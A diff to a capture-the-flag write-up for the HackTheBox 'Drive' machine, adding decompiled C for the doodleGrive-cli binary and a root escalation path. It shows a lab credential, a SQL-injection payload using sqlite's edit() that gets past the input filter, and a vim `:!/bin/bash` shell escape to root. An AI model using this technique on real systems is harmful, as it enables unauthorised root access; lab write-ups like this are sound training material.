@@ -259,6 +259,8 @@ LAB_0040231e:
 from this function we found the username:password which is `moriarty:findMeIfY0uC@nMr.Holmz!`
 There are also 2 other functions which are `sanitize_string` & `main_menu` Let's check them
 
+**sanitize_string**
+
 ```c
 void sanitize_string(char *param_1)
 
@@ -306,3 +308,108 @@ void sanitize_string(char *param_1)
 
 This is `sanitize_string` function which accepts string and removes bad characters
 these bad characters are represnted as `0x5c7b2f7c20270a00` & `0x3b` which are `\{/| '\n\00;`
+
+**main_menu**
+
+```c
+void main_menu(void)
+
+{
+  long in_FS_OFFSET;
+  char local_28 [24];
+  undefined8 local_10;
+
+  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
+  fflush((FILE *)stdin);
+  do {
+    putchar(10);
+    puts("doodleGrive cli beta-2.2: ");
+    puts("1. Show users list and info");
+    puts("2. Show groups list");
+    puts("3. Check server health and status");
+    puts("4. Show server requests log (last 1000 request)");
+    puts("5. activate user account");
+    puts("6. Exit");
+    printf("Select option: ");
+    fgets(local_28,10,(FILE *)stdin);
+    switch(local_28[0]) {
+    case '1':
+      show_users_list();
+      break;
+    case '2':
+      show_groups_list();
+      break;
+    case '3':
+      show_server_status();
+      break;
+    case '4':
+      show_server_log();
+      break;
+    case '5':
+      activate_user_account();
+      break;
+    case '6':
+      puts("exiting...");
+                    /* WARNING: Subroutine does not return */
+      exit(0);
+    default:
+      puts("please Select a valid option...");
+    }
+  } while( true );
+}
+```
+
+as we see there are different options and each option has its own function but after examining them I'm interested in `activate_user_account`
+**activate_user_account**
+
+```c
+void activate_user_account(void)
+
+{
+  size_t sVar1;
+  long in_FS_OFFSET;
+  char username [48];
+  char local_118 [264];
+  long local_10;
+
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  printf("Enter username to activate account: ");
+  fgets(username,0x28,(FILE *)stdin);
+  sVar1 = strcspn(username,"\n");
+  username[sVar1] = '\0';
+  if (username[0] == '\0') {
+    puts("Error: Username cannot be empty.");
+  }
+  else {
+    sanitize_string(username);
+    snprintf(local_118,0xfa,
+             "/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"%s\";\'"
+             ,username);
+                 printf("Activating account for user \'%s\'...\n",username);
+    system(local_118);
+  }
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return;
+}
+```
+
+I think it's interesting because it takes an input from us which is the username and this input is put within the query
+The only obstacle is **sanitize_string** function applied on this username
+after search <a href="https://sqlite.org/cli.html">here</a> i found that SQL functions that have potentially harmful side-effects, such as edit(), fts3_tokenizer(), load_extension(), readfile() and writefile().
+After examining **edit()** i found that it can open an editor and from it we can run command as root
+First we will open the cli using this command `VISUAL=/usr/bin/vim ./doodleGrive-cli` because in the documentation of edit() function you will see that the editor can be chosen by making it the value if VISUAL environment variable
+To bypass the **sanitize_string** function the payload will be `"&edit(username)-- - `
+and it gives us vim editor at which we can type `:!/bin/bash` as shown
+<img src="/assets/img/htb/drive/Capture8.JPG" alt="vim">
+and congratz you are root now
+you can get the flag
+
+```bash
+root@drive:~# /usr/bin/id
+uid=0(root) gid=0(root) groups=0(root),1003(tom)
+root@drive:~# /usr/bin/cat /root/root.txt
+********************************
+```
